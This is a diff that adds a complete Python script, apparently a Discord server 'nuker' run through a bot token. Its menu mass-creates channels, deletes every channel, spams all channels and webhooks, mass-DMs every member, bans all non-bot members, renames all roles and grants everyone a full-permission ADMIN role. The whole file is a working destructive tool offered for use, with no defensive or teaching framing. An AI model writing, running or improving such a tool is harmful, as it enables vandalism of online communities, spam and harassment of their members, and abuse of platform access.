@@ -1,0 +1,454 @@
+#!/usr/bin/env python3
+
+import discord
+from discord.ext import commands
+import asyncio
+import os
+import sys
+import time
+
+GREEN = '\033[92m'
+DARK_BLUE = '\033[34m'
+WHITE = '\033[97m'
+RED = '\033[91m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+
+def clear():
+    os.system('clear' if os.name != 'nt' else 'cls')
+
+clear()
+
+print(f"{DARK_BLUE}{BOLD}=" * 60)
+print(f"{DARK_BLUE}{BOLD}            Developer 3zF")
+print(f"{DARK_BLUE}{BOLD}=" * 60)
+print("")
+
+TOKEN = input(f"{DARK_BLUE}[?]{WHITE} Token: ").strip()
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    clear()
+    print(f"""
+{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
+{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
+{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
+{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
+{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
+{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
+    """)
+    print(f"{DARK_BLUE}{BOLD}=" * 60)
+    print(f"{GREEN}[+]{WHITE} {bot.user}")
+    print(f"{GREEN}[+]{WHITE} {len(bot.guilds)} Servers")
+    print(f"{GREEN}[+]{WHITE} {sum(g.member_count for g in bot.guilds)} Members")
+    print(f"{DARK_BLUE}{BOLD}=" * 60)
+    print("")
+    
+    print(f"{DARK_BLUE}[?]{WHITE} Select Server:")
+    print("")
+    for i, guild in enumerate(bot.guilds, 1):
+        print(f"  {DARK_BLUE}[{GREEN}{i}{DARK_BLUE}]{WHITE} {guild.name} ({guild.member_count} members)")
+    print("")
+    print(f"{DARK_BLUE}{BOLD}=" * 60)
+    print("")
+    
+    try:
+        choice = int(input(f"{DARK_BLUE}[?]{WHITE} Number: ").strip())
+        if 1 <= choice <= len(bot.guilds):
+            guild = bot.guilds[choice - 1]
+            await main_menu(guild)
+        else:
+            print(f"{RED}[!]{WHITE} Invalid!")
+            await bot.close()
+    except ValueError:
+        print(f"{RED}[!]{WHITE} Number!")
+        await bot.close()
+
+async def main_menu(guild):
+    clear()
+    print(f"""
+{DARK_BLUE}{BOLD} ██████╗██╗   ██╗███╗   ██╗██████╗ ███████╗
+{DARK_BLUE}{BOLD}██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝
+{DARK_BLUE}{BOLD}██║     ██║   ██║██╔██╗ ██║██████╔╝███████╗
+{DARK_BLUE}{BOLD}██║     ██║   ██║██║╚██╗██║██╔══██╗╚════██║
+{DARK_BLUE}{BOLD}╚██████╗╚██████╔╝██║ ╚████║██████╔╝███████║
+{DARK_BLUE}{BOLD} ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝
+    """)
+    print(f"{DARK_BLUE}{BOLD}=" * 60)
+    print(f"{GREEN}[+]{WHITE} {guild.name} - {guild.member_count} members")
+    print(f"{DARK_BLUE}{BOLD}=" * 60)
+    print("")
+    print(f"  {DARK_BLUE}[{GREEN}1{DARK_BLUE}]{WHITE} Create Rooms")
+    print(f"  {DARK_BLUE}[{GREEN}2{DARK_BLUE}]{WHITE} Delete All")
+    print(f"  {DARK_BLUE}[{GREEN}3{DARK_BLUE}]{WHITE} Spam")
+    print(f"  {DARK_BLUE}[{GREEN}4{DARK_BLUE}]{WHITE} DM")
+    print(f"  {DARK_BLUE}[{GREEN}5{DARK_BLUE}]{WHITE} Webhook")
+    print(f"  {DARK_BLUE}[{GREEN}6{DARK_BLUE}]{WHITE} Mass Ban")
+    print(f"  {DARK_BLUE}[{GREEN}7{DARK_BLUE}]{WHITE} Rename Roles")
+    print(f"  {DARK_BLUE}[{GREEN}8{DARK_BLUE}]{WHITE} Give Admin")
+    print(f"  {DARK_BLUE}[{GREEN}9{DARK_BLUE}]{WHITE} Exit")
+    print("")
+    print(f"{DARK_BLUE}{BOLD}=" * 60)
+    print("")
+    
+    while True:
+        try:
+            cmd = input(f"{DARK_BLUE}[?]{WHITE} Option: ").strip()
+            start = time.perf_counter()
+            
+            if cmd == "1":
+                await create_rooms(guild)
+            elif cmd == "2":
+                await delete_all(guild)
+            elif cmd == "3":
+                await spam_all(guild)
+            elif cmd == "4":
+                await dm_all(guild)
+            elif cmd == "5":
+                await webhook_spam(guild)
+            elif cmd == "6":
+                await mass_ban(guild)
+            elif cmd == "7":
+                await rename_roles(guild)
+            elif cmd == "8":
+                await give_admin(guild)
+            elif cmd == "9":
+                print(f"{RED}[!]{WHITE} Exiting...")
+                await bot.close()
+                sys.exit()
+            else:
+                print(f"{RED}[!]{WHITE} Invalid!")
+                
+            elapsed = time.perf_counter() - start
+            print(f"{GREEN}[+]{WHITE} Done in {elapsed:.2f}s")
+                
+        except KeyboardInterrupt:
+            print(f"\n{RED}[!]{WHITE} Exiting...")
+            await bot.close()
+            sys.exit()
+
+async def create_rooms(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ CREATE ROOMS ═══{RESET}\n")
+    
+    name = input(f"{DARK_BLUE}[?]{WHITE} Room Name: ").strip()
+    count = int(input(f"{DARK_BLUE}[?]{WHITE} Count: ").strip())
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Creating {count} rooms...\n")
+    
+    created = 0
+    chunk = 50  # a-shell مناسب
+    
+    for i in range(0, count, chunk):
+        batch = min(chunk, count - i)
+        tasks = []
+        for j in range(batch):
+            tasks.append(guild.create_text_channel(name))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in results:
+            if not isinstance(r, Exception):
+                created += 1
+                if created % 20 == 0:
+                    print(f"{GREEN}[+]{WHITE} {created} rooms")
+    
+    print(f"\n{GREEN}[+]{WHITE} {created} rooms created!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def delete_all(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ DELETE ALL ═══{RESET}\n")
+    
+    confirm = input(f"{RED}[!]{WHITE} Delete ALL? (y/n): ").strip().lower()
+    if confirm != "y":
+        print(f"{RED}[!]{WHITE} Cancelled!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    channels = list(guild.channels)
+    print(f"\n{DARK_BLUE}[+]{WHITE} Deleting {len(channels)} channels...\n")
+    
+    deleted = 0
+    chunk = 50
+    
+    for i in range(0, len(channels), chunk):
+        batch = channels[i:i+chunk]
+        tasks = [c.delete() for c in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for idx, r in enumerate(results):
+            if not isinstance(r, Exception):
+                deleted += 1
+                if deleted % 20 == 0:
+                    print(f"{RED}[-]{WHITE} {deleted} channels")
+    
+    print(f"\n{RED}[+]{WHITE} {deleted} channels deleted!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def spam_all(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ SPAM ═══{RESET}\n")
+    
+    channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+    if not channels:
+        print(f"{RED}[!]{WHITE} No channels!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"{GREEN}[+]{WHITE} {len(channels)} channels")
+    msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
+    count = int(input(f"{DARK_BLUE}[?]{WHITE} Times: ").strip())
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Spamming...\n")
+    
+    sent = 0
+    chunk = 30
+    
+    for i in range(0, count, chunk):
+        batch = min(chunk, count - i)
+        tasks = []
+        for ch in channels:
+            for j in range(batch):
+                tasks.append(ch.send(msg))
+        if tasks:
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in results:
+                if not isinstance(r, Exception):
+                    sent += 1
+                    if sent % 50 == 0:
+                        print(f"{GREEN}[+]{WHITE} {sent} messages")
+    
+    print(f"\n{GREEN}[+]{WHITE} {sent} messages sent!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def dm_all(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ DM ═══{RESET}\n")
+    
+    members = [m for m in guild.members if not m.bot]
+    if not members:
+        print(f"{RED}[!]{WHITE} No members!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"{GREEN}[+]{WHITE} {len(members)} members")
+    msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Sending DMs...\n")
+    
+    sent = 0
+    chunk = 20
+    
+    for i in range(0, len(members), chunk):
+        batch = members[i:i+chunk]
+        tasks = []
+        for m in batch:
+            try:
+                dm = await m.create_dm()
+                tasks.append(dm.send(msg))
+            except:
+                pass
+        if tasks:
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in results:
+                if not isinstance(r, Exception):
+                    sent += 1
+                    if sent % 20 == 0:
+                        print(f"{GREEN}[+]{WHITE} {sent} DMs")
+    
+    print(f"\n{GREEN}[+]{WHITE} {sent} DMs sent!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def webhook_spam(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ WEBHOOK ═══{RESET}\n")
+    
+    channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+    if not channels:
+        print(f"{RED}[!]{WHITE} No channels!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"{GREEN}[+]{WHITE} {len(channels)} channels")
+    name = input(f"{DARK_BLUE}[?]{WHITE} Webhook Name: ").strip()
+    msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
+    count = int(input(f"{DARK_BLUE}[?]{WHITE} Per channel: ").strip())
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Creating webhooks...\n")
+    
+    webhooks = []
+    chunk = 30
+    
+    for i in range(0, len(channels), chunk):
+        batch = channels[i:i+chunk]
+        tasks = [ch.create_webhook(name=name) for ch in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in results:
+            if not isinstance(r, Exception):
+                webhooks.append(r)
+                print(f"{GREEN}[+]{WHITE} Webhook created")
+    
+    if webhooks:
+        print(f"\n{DARK_BLUE}[+]{WHITE} Spamming...\n")
+        
+        sent = 0
+        tasks = []
+        for wh in webhooks:
+            for j in range(count):
+                tasks.append(wh.send(msg))
+        
+        chunk = 50
+        for i in range(0, len(tasks), chunk):
+            batch = tasks[i:i+chunk]
+            results = await asyncio.gather(*batch, return_exceptions=True)
+            for r in results:
+                if not isinstance(r, Exception):
+                    sent += 1
+                    if sent % 50 == 0:
+                        print(f"{GREEN}[+]{WHITE} {sent} webhook messages")
+        
+        print(f"\n{GREEN}[+]{WHITE} {sent} webhook messages sent!")
+    else:
+        print(f"{RED}[!]{WHITE} No webhooks created!")
+    
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def mass_ban(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ MASS BAN ═══{RESET}\n")
+    
+    members = [m for m in guild.members if not m.bot]
+    if not members:
+        print(f"{RED}[!]{WHITE} No members!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"{RED}[!]{WHITE} {len(members)} members")
+    confirm = input(f"{RED}[!]{WHITE} Confirm? (y/n): ").strip().lower()
+    if confirm != "y":
+        print(f"{RED}[!]{WHITE} Cancelled!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Banning...\n")
+    
+    banned = 0
+    chunk = 30
+    
+    for i in range(0, len(members), chunk):
+        batch = members[i:i+chunk]
+        tasks = [m.ban(reason="Banned") for m in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for idx, r in enumerate(results):
+            if not isinstance(r, Exception):
+                banned += 1
+                if banned % 20 == 0:
+                    print(f"{RED}[+]{WHITE} {banned} banned")
+    
+    print(f"\n{RED}[+]{WHITE} {banned} members banned!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def rename_roles(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ RENAME ROLES ═══{RESET}\n")
+    
+    roles = [r for r in guild.roles if r.name != "@everyone"]
+    if not roles:
+        print(f"{RED}[!]{WHITE} No roles!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"{GREEN}[+]{WHITE} {len(roles)} roles")
+    new_name = input(f"{DARK_BLUE}[?]{WHITE} New Name: ").strip()
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Renaming...\n")
+    
+    renamed = 0
+    chunk = 30
+    
+    for i in range(0, len(roles), chunk):
+        batch = roles[i:i+chunk]
+        tasks = [r.edit(name=new_name) for r in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for idx, r in enumerate(results):
+            if not isinstance(r, Exception):
+                renamed += 1
+                if renamed % 20 == 0:
+                    print(f"{GREEN}[+]{WHITE} {renamed} roles")
+    
+    print(f"\n{GREEN}[+]{WHITE} {renamed} roles renamed!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+async def give_admin(guild):
+    clear()
+    print(f"{DARK_BLUE}{BOLD}═══ GIVE ADMIN ═══{RESET}\n")
+    
+    members = [m for m in guild.members if not m.bot]
+    if not members:
+        print(f"{RED}[!]{WHITE} No members!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"{GREEN}[+]{WHITE} {len(members)} members")
+    confirm = input(f"{RED}[!]{WHITE} Give ADMIN? (y/n): ").strip().lower()
+    if confirm != "y":
+        print(f"{RED}[!]{WHITE} Cancelled!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    admin_role = discord.utils.get(guild.roles, name="ADMIN")
+    if not admin_role:
+        try:
+            admin_role = await guild.create_role(name="ADMIN", permissions=discord.Permissions.all())
+            print(f"{GREEN}[+]{WHITE} Created ADMIN role")
+        except:
+            admin_role = guild.roles[-1] if guild.roles else None
+    
+    if not admin_role:
+        print(f"{RED}[!]{WHITE} No role!")
+        input(f"{DARK_BLUE}[?]{WHITE} Enter...")
+        await main_menu(guild)
+        return
+    
+    print(f"\n{DARK_BLUE}[+]{WHITE} Giving ADMIN...\n")
+    
+    given = 0
+    chunk = 30
+    
+    for i in range(0, len(members), chunk):
+        batch = members[i:i+chunk]
+        tasks = [m.add_roles(admin_role) for m in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for idx, r in enumerate(results):
+            if not isinstance(r, Exception):
+                given += 1
+                if given % 20 == 0:
+                    print(f"{GREEN}[+]{WHITE} {given} members")
+    
+    print(f"\n{GREEN}[+]{WHITE} {given} members got ADMIN!")
+    input(f"\n{DARK_BLUE}[?]{WHITE} Enter...")
+    await main_menu(guild)
+
+try:
+    bot.run(TOKEN, reconnect=True)
+except discord.LoginFailure:
+    print(f"{RED}[!]{WHITE} Invalid Token!")
+except Exception as e:
+    print(f"{RED}[!]{WHITE} Error: {e}")
